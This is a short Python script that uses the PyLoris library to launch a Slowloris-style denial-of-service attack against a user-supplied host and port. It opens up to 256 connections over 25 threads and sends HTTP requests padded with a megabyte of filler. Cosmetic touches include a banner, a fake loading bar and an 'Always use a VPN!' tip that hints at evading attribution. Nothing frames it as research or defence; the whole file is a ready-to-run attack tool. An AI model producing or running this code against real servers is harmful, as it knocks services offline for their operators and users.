#! /usr/bin/env python
from libloris import *
import time, os

print\
"""
88      dP"Yb  88""Yb 88 .dP"Y8 
88     dP   Yb 88__dP 88 `Ybo." 
88  .o Yb   dP 88"Yb  88 o.`Y8b 
88ood8  YbodP  88  Yb 88 8bodP' 
"""
# Connection information
os.system("color 0a")
print 'Always use a VPN!'
time.sleep(1)
print "STARTING     .....        "

print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(0.5)
print "[=======             ] 40%"
time.sleep(0.1)
print "[============        ] 60%"
time.sleep(0.4)
print "[=================   ] 85%"
time.sleep(0.35)
print "[====================] 100%"
time.sleep(0.2) 
host = raw_input('HOST: ')
port = input('PORT: ')

def main(host, port):
    # Instantiate the ScriptLoris object
    loris = ScriptLoris()

    # Set the connection  options
    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Build the HTTP request body
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'
    loris.options['request'] += 'A' * 1024 * 1024

    # Launch the attack
    loris.mainloop()

if __name__ == "__main__":
    main(host, port)